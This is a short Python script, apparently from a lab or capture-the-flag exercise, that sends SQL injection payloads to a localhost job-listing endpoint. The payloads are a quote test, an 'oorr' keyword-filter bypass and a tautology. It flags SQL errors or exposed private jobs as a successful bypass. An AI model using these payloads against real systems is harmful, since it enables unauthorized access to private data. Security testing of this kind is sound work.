import urllib.request, json, sys
port = sys.argv[1] if len(sys.argv) > 1 else "8000"

# Test SQLi manually
tests = [
    ("normal", {"job_type": "front-end"}),
    ("quote test", {"job_type": "'"}),
    ("oorr bypass", {"job_type": "' oorr 1=1--"}),
    ("error probe", {"job_type": "' OR '1'='1"}),
]

for name, body in tests:
    data = json.dumps(body).encode()
    req = urllib.request.Request(
        "http://localhost:{}/jobs".format(port),
        data=data,
        headers={"Content-Type": "application/json"})
    try:
        r = urllib.request.urlopen(req, timeout=5)
        html = r.read().decode()
        status = r.status
        print("[{}] {}: status={} len={}".format(name, body, status, len(html)))
        # Show first 200 chars
        if "error" in html.lower() or "sql" in html.lower():
            print("  SQL ERROR DETECTED:", html[:200])
        elif "private" in html.lower():
            print("  BYPASS SUCCESS! (private job visible)")
            print("  ", html[:300])
        else:
            print("  ", html[:100])
    except urllib.error.HTTPError as e:
        body = e.read().decode()
        print("[{}] {}: HTTP {} - {}".format(name, body, e.code, body[:150]))
    except Exception as e:
        print("[{}] ERROR: {}".format(name, str(e)[:80]))
    print()
